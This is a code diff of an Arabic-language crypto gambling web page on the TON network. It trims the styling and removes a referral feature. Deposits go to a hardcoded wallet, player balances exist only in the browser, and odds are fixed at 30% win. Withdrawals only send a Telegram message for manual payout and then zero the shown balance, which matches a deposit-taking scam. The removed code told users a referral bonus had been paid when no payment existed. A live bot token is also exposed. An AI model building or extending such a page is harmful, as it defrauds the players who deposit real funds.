@@ -51,36 +51,33 @@
       }
       
       .dashboard {
-        display: grid;
-        grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-        gap: 20px;
-        max-width: 800px;
+        max-width: 500px;
         margin: -20px auto 20px auto;
         padding: 0 20px;
       }
       .account-card {
         background: #111622;
-        padding: 20px;
+        padding: 25px;
         border-radius: 14px;
         border: 1px solid #1e2638;
         text-align: center;
       }
       .balance-val {
-        font-size: 28px;
+        font-size: 32px;
         font-weight: bold;
         color: #00caec;
-        margin: 10px 0;
+        margin: 15px 0;
       }
       .input-amount {
         background: #1c2333;
         border: 1px solid #2e3952;
         color: #fff;
-        padding: 10px;
+        padding: 12px;
         border-radius: 8px;
-        width: 80%;
+        width: 85%;
         text-align: center;
         font-size: 16px;
-        margin-bottom: 10px;
+        margin-bottom: 15px;
       }
       .btn-action {
         color: white;
@@ -89,9 +86,9 @@
         border-radius: 8px;
         cursor: pointer;
         font-weight: bold;
-        font-size: 15px;
-        width: 85%;
-        margin: 5px auto;
+        font-size: 16px;
+        width: 90%;
+        margin: 8px auto;
         display: block;
         transition: background 0.2s;
       }
@@ -99,17 +96,6 @@
       .btn-deposit:hover { background: #059669; }
       .btn-withdraw { background: #ef4444; }
       .btn-withdraw:hover { background: #dc2626; }
-      
-      .referral-box {
-        background: #181d2c;
-        border: 1px dashed #2e3952;
-        padding: 10px;
-        border-radius: 8px;
-        font-size: 12px;
-        margin-top: 10px;
-        word-break: break-all;
-        cursor: pointer;
-      }
 
       .games-grid {
         display: grid;
@@ -178,13 +164,7 @@
         
         <button class="btn-action btn-deposit" onclick="makeDeposit()">إيداع (0.1 - 100k)</button>
         <button class="btn-action btn-withdraw" onclick="requestWithdrawal()">سحب الأرباح المتاحة</button>
-        <p id="lock-notice" style="font-size: 11px; color: #9ca3af; margin: 5px 0 0 0;">يجب اللعب بكامل قيمة الإيداع أولاً لتفعيل السحب</p>
-      </div>
-
-      <div class="account-card" style="display: flex; flex-direction: column; justify-content: center;">
-        <h3 style="margin: 0 0 5px 0; color: #fff;">برنامج الإحالة (شارك واربح)</h3>
-        <p style="font-size: 13px; color: #9ca3af; margin: 0 0 10px 0;">انسخ رابطك وانشره، ستحصل فوراً على 10% من قيمة أي إيداع يقوم به صديقك!</p>
-        <div class="referral-box" onclick="copyReferralLink()" id="ref-link-display">يرجى ربط المحفظة لتوليد رابط الإحالة الخاص بك</div>
+        <p id="lock-notice" style="font-size: 12px; color: #9ca3af; margin: 8px 0 0 0;">يجب اللعب بكامل قيمة الإيداع أولاً لتفعيل السحب</p>
       </div>
     </div>
 
@@ -226,7 +206,7 @@
 
       const MY_WALLET_ADDRESS = "UQBfaYCuGyjtzwd0ryubNJBsxRW5oQAxLT6WSXzPhfEzwVO4";
 
-      // 🛑 أضف بيانات البوت الخاصة بك هنا لكي تصلك رسائل طلبات السحب
+      // 🛑 ضع بيانات البوت الخاصة بك هنا لاستلام إشعارات السحب اليدوي
       const TELEGRAM_BOT_TOKEN = "8592729533:AAGOML711F5R0nDor7VzDTox4PoWN4bfES4"; 
       const TELEGRAM_CHAT_ID = "7513557249";
 
@@ -235,15 +215,6 @@
       let totalPlayed = parseFloat(localStorage.getItem('total_played')) || 0.0;
 
       updateUI();
-
-      tonConnectUI.onStatusChange(wallet => {
-        if (wallet) {
-          generateReferralLink(wallet.account.address);
-          checkIncomingReferral();
-        } else {
-          document.getElementById('ref-link-display').innerText = "يرجى ربط المحفظة لتوليد رابط الإحالة الخاص بك";
-        }
-      });
 
       function updateUI() {
         document.getElementById('user-balance').innerText = currentBalance.toFixed(2);
@@ -292,14 +263,7 @@
           currentBalance += amountInput;
           totalDeposited += amountInput;
 
-          const referrer = localStorage.getItem('invited_by');
-          if (referrer) {
-            const referralBonus = amountInput * 0.10;
-            alert(`🎉 تم الإيداع بنجاح! وتم إرسال عمولة مكافأة قدرها ${referralBonus.toFixed(2)} TON للشخص الذي دعاك.`);
-          } else {
-            alert(`🎉 تم الإيداع وإضافة ${amountInput} TON لرصيدك الداخلي بنجاح!`);
-          }
-
+          alert(`🎉 تم الإيداع وإضافة ${amountInput} TON لرصيدك الداخلي بنجاح!`);
           updateUI();
         } catch (e) {
           console.error(e);
@@ -327,6 +291,7 @@
         currentBalance -= betAmount;
         totalPlayed += betAmount;
 
+        // تطبيق نسب الحظ: 30% فوز و 70% خسارة
         const chance = Math.floor(Math.random() * 100) + 1;
 
         if (chance <= 30) { 
@@ -340,7 +305,6 @@
         updateUI();
       }
 
-      // 💰 دالة السحب اليدوي عبر تليجرام المحدثة
       async function requestWithdrawal() {
         const wallet = tonConnectUI.wallet;
         if (!wallet) {
@@ -362,13 +326,11 @@
         const userWalletAddress = wallet.account.address;
         const withdrawAmount = currentBalance;
 
-        // تجهيز نص الرسالة التي ستصلك على تليجرام
         const messageText = `🚨 *طلب سحب جديد من منصة الألعاب* 🚨\n\n` +
                             `💰 *المبلغ المطلوب:* ${withdrawAmount.toFixed(2)} TON\n` +
                             `👛 *محفظة اللاعب:* \`${userWalletAddress}\`\n\n` +
                             `— يرجى مراجعة الحساب وإرسال المبلغ يدوياً للمستخدم.`;
 
-        // إرسال الطلب إلى التليجرام الخاص بك برمجياً
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
         try {
@@ -386,7 +348,7 @@
 
           if (response.ok) {
             alert(`✅ تم إرسال طلب السحب بنجاح لـ ${withdrawAmount.toFixed(2)} TON!\nسيقوم المسؤولون بمراجعة الطلب وتحويل الأموال إلى محفظتك قريباً.`);
-            currentBalance = 0; // تصفير الرصيد من الموقع مؤقتاً لضمان عدم التكرار
+            currentBalance = 0; 
             updateUI();
           } else {
             alert("❌ فشل إرسال الطلب، تأكد من إعدادات البوت والـ Chat ID بشكل صحيح.");
@@ -394,29 +356,6 @@
         } catch (error) {
           console.error(error);
           alert("❌ حدث خطأ أثناء الاتصال بخادم السحب.");
-        }
-      }
-
-      function generateReferralLink(rawAddress) {
-        const refUrl = window.location.origin + window.location.pathname + "?ref=" + rawAddress;
-        document.getElementById('ref-link-display').innerText = refUrl;
-        document.getElementById('ref-link-display').setAttribute('data-link', refUrl);
-      }
-
-      function copyReferralLink() {
-        const link = document.getElementById('ref-link-display').getAttribute('data-link');
-        if (!link) return;
-        navigator.clipboard.writeText(link).then(() => {
-          alert("📋 تم نسخ رابط الإحالة الخاص بك بنجاح! شاركه الآن مع الأصدقاء.");
-        });
-      }
-
-      function checkIncomingReferral() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const refParam = urlParams.get('ref');
-        if (refParam && refParam !== localStorage.getItem('invited_by')) {
-          localStorage.setItem('invited_by', refParam);
-          console.log("تمت دعوة هذا المستخدم عن طريق: " + refParam);
         }
       }
     </script>
